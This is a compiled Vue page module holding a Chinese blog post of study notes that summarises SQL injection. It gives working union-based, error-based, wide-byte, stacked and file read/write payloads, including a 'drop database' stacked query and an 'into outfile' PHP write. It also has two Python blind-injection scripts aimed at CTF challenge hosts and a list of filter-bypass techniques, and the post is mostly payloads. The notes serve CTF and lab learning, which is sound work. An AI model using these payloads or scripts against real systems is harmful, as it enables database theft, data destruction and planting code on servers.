import{Bt as e,G as t,Ht as n,Q as r,U as i,W as a,er as o,qn as s,qt as c,yn as l}from"./framework.rjUWPBWi.js";import{n as u}from"./theme.HhYiq06G.js";import"./chunks/vue-i18n.Bu3NfVdi.js";import{a as d,i as f}from"./chunks/vue-router.BUgoFmsr.js";var p={__name:`sql注入总结`,setup(p,{expose:m}){let h=s(JSON.parse(`{"title":"sql注入总结","description":"","frontmatter":{"title":"sql注入总结","date":"2025-04-02 19:11:45","tags":["sql注入"],"categories":["学习笔记"]},"headers":[],"relativePath":"pages/posts/sql注入总结.md"}`)),g=d(),_=f(),v=Object.assign(_.meta.frontmatter||{},h.value?.frontmatter||{});return g.currentRoute.value.data=h.value,n(`valaxy:frontmatter`,v),globalThis.$frontmatter=v,m({frontmatter:{title:`sql注入总结`,date:`2025-04-02 19:11:45`,tags:[`sql注入`],categories:[`学习笔记`]}}),(n,s)=>{let d=u;return e(),a(d,{frontmatter:o(v)},{"main-content-md":l(()=>[s[0]||=i(`p`,null,`摘要：原理 sql注入发生原理： 用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库 注入类型 常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入… 基本操作 1.判断显示位 2.爆数据库的名。`,-1),t(` more `),s[1]||=i(`h3`,{id:`原理`,tabindex:`-1`},[r(`原理 `),i(`a`,{class:`header-anchor`,href:`#原理`,"aria-label":`Permalink to "原理"`},`​`)],-1),s[2]||=i(`p`,null,`sql注入发生原理：`,-1),s[3]||=i(`p`,null,`用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库`,-1),s[4]||=i(`h4`,{id:`注入类型`,tabindex:`-1`},[r(`注入类型 `),i(`a`,{class:`header-anchor`,href:`#注入类型`,"aria-label":`Permalink to "注入类型"`},`​`)],-1),s[5]||=i(`p`,null,`常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入…`,-1),s[6]||=i(`h3`,{id:`基本操作`,tabindex:`-1`},[r(`基本操作 `),i(`a`,{class:`header-anchor`,href:`#基本操作`,"aria-label":`Permalink to "基本操作"`},`​`)],-1),s[7]||=i(`p`,null,[i(`strong`,null,`1.判断显示位`)],-1),s[8]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?id=SELECT first name, last_name FROM users WHERE user_id = '1' union select 1,2,3#;
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[9]||=i(`p`,null,[i(`strong`,null,`2.爆数据库的名字`)],-1),s[10]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?id = '1' union select 1,user(),database()--+‘；
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[11]||=i(`p`,null,[i(`strong`,null,`3.爆数据库中的表`)],-1),s[12]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?id = '-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+';
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[13]||=i(`p`,null,[i(`strong`,null,`4.爆表中的字段`)],-1),s[14]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?id= '-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+'，
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[15]||=i(`p`,null,[i(`strong`,null,`5.爆相应字段的所有数据`)],-1),s[16]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?id = '-1' union select 1,2,group_concat(user,password) from users--+';
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[17]||=i(`h3`,{id:`盲注脚本`,tabindex:`-1`},[r(`盲注脚本 `),i(`a`,{class:`header-anchor`,href:`#盲注脚本`,"aria-label":`Permalink to "盲注脚本"`},`​`)],-1),s[18]||=i(`h4`,{id:`布尔盲注`,tabindex:`-1`},[r(`布尔盲注 `),i(`a`,{class:`header-anchor`,href:`#布尔盲注`,"aria-label":`Permalink to "布尔盲注"`},`​`)],-1),s[19]||=i(`div`,{class:`language-py`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`py`),i(`pre`,null,[i(`code`,{class:`language-py`},`import requests
if __name__ == '__main__' :
    url = 'http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/'
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            #payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,0)%23'
            #payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,0)%23'
            #payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagba"),{i},1))>{mid},1,0)%23'
            payload = f'if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),{i},1))>{mid},1,0)%23'
            # print(payload)
            data={
                "uname":f"admin' and {payload}#",
                "passwd":12346
            }
            r = requests.post(url=url,data=data)
            if 'flag.jpg' in r.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[20]||=i(`h4`,{id:`时间盲注`,tabindex:`-1`},[r(`时间盲注 `),i(`a`,{class:`header-anchor`,href:`#时间盲注`,"aria-label":`Permalink to "时间盲注"`},`​`)],-1),s[21]||=i(`div`,{class:`language-py`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`py`),i(`pre`,null,[i(`code`,{class:`language-py`},`import requests
import time
if __name__ == '__main__' :
    url = 'http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1"%20and%20'
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            #payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,sleep(3))%23'
            #payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,sleep(2))%23'
            #payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagugs"),{i},1))>{mid},1,sleep(2))%23'
            payload = f'if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),{i},1))>{mid},1,sleep(2))%23'
            # print(payload)
            stime=time.time()
            r = requests.get(url=url + payload)
            if time.time()-stime<2:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[22]||=i(`h3`,{id:`注入类型-1`,tabindex:`-1`},[r(`注入类型 `),i(`a`,{class:`header-anchor`,href:`#注入类型-1`,"aria-label":`Permalink to "注入类型"`},`​`)],-1),s[23]||=i(`h4`,{id:`二次注入`,tabindex:`-1`},[r(`二次注入 `),i(`a`,{class:`header-anchor`,href:`#二次注入`,"aria-label":`Permalink to "二次注入"`},`​`)],-1),s[24]||=i(`p`,null,`其产生原因是：服务器端虽然对用户的直接输入做了一些过滤或者将一些字符进行转义，但是对于已经存入数据库的信息是完全信任的，即：不校验数据库信息是否合法`,-1),s[25]||=i(`p`,null,`利用场景主要有：靶机里同时存在注册和登录页面，且需要获得admin密码`,-1),s[26]||=i(`h4`,{id:`宽字节注入`,tabindex:`-1`},[r(`宽字节注入 `),i(`a`,{class:`header-anchor`,href:`#宽字节注入`,"aria-label":`Permalink to "宽字节注入"`},`​`)],-1),s[27]||=i(`p`,null,`宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作`,-1),s[28]||=i(`p`,null,`通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。因此当我们输入’时，在php代码中如果有过滤的话会利用转义字符\\进行转义，而利用urlencode表示的话，就为%5c%27，我们若想要将%5c去掉，则若此时mysql用的是GBK编码，则可以在前面加上一个编码如**%df**，使得系统认定%df%5c表示着一个汉字。`,-1),s[29]||=i(`div`,{class:`language-sql`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`sql`),i(`pre`,null,[i(`code`,{class:`language-sql`},`?id=-1%df%27union select 1,2,group_concat(column_name)from information_schema.columns where table_name=%df'users %df'--+
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[30]||=i(`h4`,{id:`堆叠注入`,tabindex:`-1`},[r(`堆叠注入 `),i(`a`,{class:`header-anchor`,href:`#堆叠注入`,"aria-label":`Permalink to "堆叠注入"`},`​`)],-1),s[31]||=i(`p`,null,[r(`使用前提：堆叠注入使用的条件很苛刻，会受到API以及数据库引擎，或者是权限的限制。只有当调用数据库的函数支持执行多条SQL语句的时候才可以使用。例如 `),i(`strong`,null,`mysqli_multi_query()`),r(` 函数就支持多条SQL语句同时执行，而 mysqli_query() 函数就不支持。在实际应用中，大多数都使用的是 `),i(`strong`,null,`mysqli_query()`),r(` 函数，所以能使用堆叠注入的说明该网站做的很不成功，因为堆叠注入的爆破效果太好了。一般PHP搭建的网站为了防止SQL注入都会使用 mysqli_query() 函数。`)],-1),s[32]||=i(`p`,null,`利用方式:在我们输入的语句后面加上分号表示该语句结束，之后再输入另一条语句就可以了。例如可以先写一个查询语句，之后加分号表示查询结束，再在分号后输入删除语句。这样就叫堆叠注入。`,-1),s[33]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?id=show database();drop database <数据库名>;
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[34]||=i(`h4`,{id:`文件读取写入注入`,tabindex:`-1`},[r(`文件读取写入注入 `),i(`a`,{class:`header-anchor`,href:`#文件读取写入注入`,"aria-label":`Permalink to "文件读取写入注入"`},`​`)],-1),s[35]||=i(`h5`,{id:`文件读取`,tabindex:`-1`},[r(`文件读取 `),i(`a`,{class:`header-anchor`,href:`#文件读取`,"aria-label":`Permalink to "文件读取"`},`​`)],-1),s[36]||=i(`p`,null,[i(`code`,null,`union select 1,2,load_file('文件路径')`)],-1),s[37]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`union select 1,2,load_file('D:/test.txt')
?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)
 （%20是换行，%27是引号，有路径时，防止转义可以将\\改为\\\\或者/）

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[38]||=i(`h5`,{id:`文件写入`,tabindex:`-1`},[r(`文件写入 `),i(`a`,{class:`header-anchor`,href:`#文件写入`,"aria-label":`Permalink to "文件写入"`},`​`)],-1),s[39]||=i(`p`,null,[i(`strong`,null,[i(`code`,null,`union select 1,'`),r(`<?php phpinfo();?>`),i(`code`,null,`',3 into outfile '文件路径' --+`)])],-1),s[40]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`union select 1,'<?php phpinfo();?>',3 into outfile 'E:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\1.php' --+
此时就将 phpinfo() 的内容写入 E:\\phpStudy\\WWW\\sqli\\Less-7 路径下并创建一个1.php文件

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[41]||=i(`h4`,{id:`报错注入`,tabindex:`-1`},[r(`报错注入 `),i(`a`,{class:`header-anchor`,href:`#报错注入`,"aria-label":`Permalink to "报错注入"`},`​`)],-1),s[42]||=i(`p`,null,[i(`strong`,null,`updatexml（）函数`)],-1),s[43]||=i(`ul`,null,[i(`li`,null,`updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。`),i(`li`,null,`作用：改变文档中符合条件的节点的值`),i(`li`,null,`语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据`),i(`li`,null,`updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）`),i(`li`,null,`例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。`)],-1),s[44]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`爆出数据库
1' and updatexml(1,concat(0x7e,database(),0x7er),1)#

爆当前数据库表信息
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #

爆user表字段信息
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),0x7e),1) #

爆数据库内容、、
1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[45]||=i(`p`,null,`extractvalue()函数其实与updatexml()函数大同小异，都是通过xpath路径错误报错`,-1),s[46]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`爆出数据库
1' and extractvalue(1,concat(0x7e,user(),0x7e,database())) #

爆当前数据库表信息
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #

爆user表字段信息
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) #

爆数据库内容、、
1' and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[47]||=i(`h3`,{id:`handler命令注入`,tabindex:`-1`},[r(`handler命令注入 `),i(`a`,{class:`header-anchor`,href:`#handler命令注入`,"aria-label":`Permalink to "handler命令注入"`},`​`)],-1),s[48]||=i(`div`,{class:`language-sql`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`sql`),i(`pre`,null,[i(`code`,{class:`language-sql`},`HANDLER tbl_name OPEN [ [AS] alias]
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name CLOSE
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[49]||=i(`h3`,{id:`sql注入绕过`,tabindex:`-1`},[r(`SQL注入绕过 `),i(`a`,{class:`header-anchor`,href:`#sql注入绕过`,"aria-label":`Permalink to "SQL注入绕过"`},`​`)],-1),s[50]||=i(`h4`,{id:`_1-注释字符绕过`,tabindex:`-1`},[i(`strong`,null,`1.注释字符绕过`),r(),i(`a`,{class:`header-anchor`,href:`#_1-注释字符绕过`,"aria-label":`Permalink to "**1.注释字符绕过**"`},`​`)],-1),s[51]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`-- 注释内容
# 注释内容      url编码为%23
/*注释内容*/
;
/x00
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[52]||=i(`h4`,{id:`_2-双写绕过`,tabindex:`-1`},[i(`strong`,null,`2.双写绕过`),r(),i(`a`,{class:`header-anchor`,href:`#_2-双写绕过`,"aria-label":`Permalink to "**2.双写绕过**"`},`​`)],-1),s[53]||=i(`p`,null,`绕过场景：代码使用replace将字符代替为空时使用`,-1),s[54]||=i(`p`,null,`例如，过滤了select`,-1),s[55]||=i(`p`,null,[r(`使用`),i(`code`,null,`selselectect =>select`)],-1),s[56]||=i(`h4`,{id:`_3-大写绕过`,tabindex:`-1`},[i(`strong`,null,`3.大写绕过`),r(),i(`a`,{class:`header-anchor`,href:`#_3-大写绕过`,"aria-label":`Permalink to "**3.大写绕过**"`},`​`)],-1),s[57]||=i(`p`,null,[r(`在正则匹配对大小写不敏感时，也就是正则匹配使用了`),i(`code`,null,`\\i`),r(`，忽略了大小写。而Mysql对大小写也不敏感时使用`)],-1),s[58]||=i(`p`,null,`例如，`,-1),s[59]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`/select/i

使用SeLect进行绕过
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[60]||=i(`h4`,{id:`_4-内联注释`,tabindex:`-1`},[i(`strong`,null,`4.内联注释`),r(),i(`a`,{class:`header-anchor`,href:`#_4-内联注释`,"aria-label":`Permalink to "**4.内联注释**"`},`​`)],-1),s[61]||=i(`p`,null,[i(`strong`,null,`内联注释的作用是增加SQL语句的可移植性。比如，将MySQL特有的语法使用内联注释的形式来编写，在这种情况下，MySQL可以正常的解析并执行内联注释中的代码，但是其它的SQL服务器则忽略内联注释中的内容。`)],-1),s[62]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`/*! MySQL特有的语法 */
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[63]||=i(`p`,null,[r(`例如MySQL服务器可以在以下语句中识别`),i(`code`,null,`STRAIGHT_JOIN`),r(`关键字，而其他服务器则不能：`)],-1),s[64]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[65]||=i(`p`,null,`/*! */类型的注释，内部语句会被执行`,-1),s[66]||=i(`p`,null,`一般用来绕过空格`,-1),s[67]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`select bbb from table1 where aaa='' union /*! select database()*/;
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[68]||=i(`h4`,{id:`_5-特殊编码绕过`,tabindex:`-1`},[i(`strong`,null,`5.特殊编码绕过`),r(),i(`a`,{class:`header-anchor`,href:`#_5-特殊编码绕过`,"aria-label":`Permalink to "**5.特殊编码绕过**"`},`​`)],-1),s[69]||=i(`p`,null,`16进制编码绕过`,-1),s[70]||=i(`p`,null,`如果在查询字段名的时候表名被过滤，或者是数据库中某些特定字符被过滤，则可以使用16进制绕过。`,-1),s[71]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`select column_name from information_schema.columns where table_name=0x7573657273;
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[72]||=i(`p`,null,[i(`code`,null,`0x7573657273`),r(`为users的16进制编码`)],-1),s[73]||=i(`h4`,{id:`_6-双重url编码绕过`,tabindex:`-1`},[i(`strong`,null,`6.双重url编码绕过`),r(),i(`a`,{class:`header-anchor`,href:`#_6-双重url编码绕过`,"aria-label":`Permalink to "**6.双重url编码绕过**"`},`​`)],-1),s[74]||=i(`p`,null,`对字符串进行二次url编码，可绕过关键字过滤`,-1),s[75]||=i(`h4`,{id:`_7-空格绕过`,tabindex:`-1`},[i(`strong`,null,`7.空格绕过`),r(),i(`a`,{class:`header-anchor`,href:`#_7-空格绕过`,"aria-label":`Permalink to "**7.空格绕过**"`},`​`)],-1),s[76]||=i(`p`,null,`可以使用%0d(回车)、%0a(换行)、%09(tab制表)、/**/、%a0(&nbsp）、%0b(垂直制表符)、%0c（换页符）`,-1),s[77]||=i(`h4`,{id:`_8-过滤了-and、or、-、-、-、regexp`,tabindex:`-1`},[r(`8.过滤了 and、or、=、>、<、regexp `),i(`a`,{class:`header-anchor`,href:`#_8-过滤了-and、or、-、-、-、regexp`,"aria-label":`Permalink to "8.过滤了 and、or、=、>、<、regexp"`},`​`)],-1),s[78]||=i(`p`,null,`使用 &&、||、 like、greatest(返回值的最大值)、least（返回值的最小值）`,-1),s[79]||=i(`h4`,{id:`_9-过滤了逗号`,tabindex:`-1`},[i(`strong`,null,`9.过滤了逗号`),r(),i(`a`,{class:`header-anchor`,href:`#_9-过滤了逗号`,"aria-label":`Permalink to "**9.过滤了逗号**"`},`​`)],-1),s[80]||=i(`p`,null,`limit使用from或者offset`,-1),s[81]||=i(`p`,null,`select substr(database(0from1for1);select mid(database(0from1for1);`,-1),s[82]||=i(`p`,null,`substr使用from for`,-1),s[83]||=i(`p`,null,`select * from news limit 0,1 <=> select * from news limit 1 offset 0`,-1),s[84]||=i(`p`,null,`if语句使用exp()函数代替`,-1),s[85]||=i(`p`,null,`exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句`,-1),s[86]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`||exp(710-... 710-rlike 710-...)
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[87]||=i(`p`,null,[r(`即如果 `),i(`code`,null,`(... rlike ...)`),r(` 中的语句执行匹配后的结果为`),i(`code`,null,`True`),r(`，经过减号转换后为 `),i(`code`,null,`exp(710-1)`),r(` 后不会溢出；若为`),i(`code`,null,`false`),r(`，转换为 `),i(`code`,null,`exp(710-0)`),r(` 后则会溢出并报错`)],-1),s[88]||=i(`h4`,{id:`_10、绕过注释符号-–-过滤`,tabindex:`-1`},[i(`strong`,null,`10、绕过注释符号（#，–）过滤`),r(),i(`a`,{class:`header-anchor`,href:`#_10、绕过注释符号-–-过滤`,"aria-label":`Permalink to "**10、绕过注释符号（#，--）过滤**"`},`​`)],-1),s[89]||=i(`p`,null,`使用单引号、双引号进行引号闭合绕过`,-1),s[90]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`SELECT * FROM users WHERE id='$_POST[id]' LIMIT 0,1
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[91]||=i(`p`,null,`我们传入`,-1),s[92]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`id=1' and 1=2 union select 1,2,3' 
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[93]||=i(`p`,null,`这样语句就变成了`,-1),s[94]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`SELECT * FROM users WHERE id='1' and 1=2 union select 1,2,3' ' LIMIT 0,1
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[95]||=i(`p`,null,`引号正常闭合`,-1),s[96]||=i(`h4`,{id:`_11、绕过union-select-where等`,tabindex:`-1`},[r(`11、绕过union，select，where等 `),i(`a`,{class:`header-anchor`,href:`#_11、绕过union-select-where等`,"aria-label":`Permalink to "11、绕过union，select，where等"`},`​`)],-1),s[97]||=i(`p`,null,`可尝试在关键字内插入/**/`,-1),s[98]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`U/**/NION/**/SE/**/LECT/**/user，pwd from user

union select user,pwd from user
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[99]||=i(`h4`,{id:`_12-等价函数绕过`,tabindex:`-1`},[r(`12.等价函数绕过 `),i(`a`,{class:`header-anchor`,href:`#_12-等价函数绕过`,"aria-label":`Permalink to "12.等价函数绕过"`},`​`)],-1),s[100]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`hex()、bin() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[101]||=i(`h4`,{id:`_13-information过滤`,tabindex:`-1`},[r(`13.information过滤 `),i(`a`,{class:`header-anchor`,href:`#_13-information过滤`,"aria-label":`Permalink to "13.information过滤"`},`​`)],-1),s[102]||=i(`p`,null,[i(`code`,null,`sys.schema_auto_increment_columns`),r(`代替`),i(`code`,null,`information_schema`),r(`，用来对表自增ID的监控`)],-1),s[103]||=i(`p`,null,[r(`但是 `),i(`code`,null,`sys.schema_auto_increment_columns`),r(`这个库有些局限性，一般要超级管理员才可以访问sys。`)],-1),s[104]||=i(`p`,null,[r(`类似可以利用的表还有：`),i(`code`,null,`mysql.innodb_table_stats`),r(`、`),i(`code`,null,`mysql.innodb_table_index`),r(`同样存放有库名表名`)],-1)]),"main-header":l(()=>[c(n.$slots,`main-header`)]),"main-header-after":l(()=>[c(n.$slots,`main-header-after`)]),"main-nav":l(()=>[c(n.$slots,`main-nav`)]),"main-content-before":l(()=>[c(n.$slots,`main-content-before`)]),"main-content":l(()=>[c(n.$slots,`main-content`)]),"main-content-after":l(()=>[c(n.$slots,`main-content-after`)]),"main-nav-before":l(()=>[c(n.$slots,`main-nav-before`)]),"main-nav-after":l(()=>[c(n.$slots,`main-nav-after`)]),comment:l(()=>[c(n.$slots,`comment`)]),footer:l(()=>[c(n.$slots,`footer`)]),aside:l(()=>[c(n.$slots,`aside`)]),"aside-custom":l(()=>[c(n.$slots,`aside-custom`)]),default:l(()=>[c(n.$slots,`default`)]),_:3},8,[`frontmatter`])}}};export{p as default};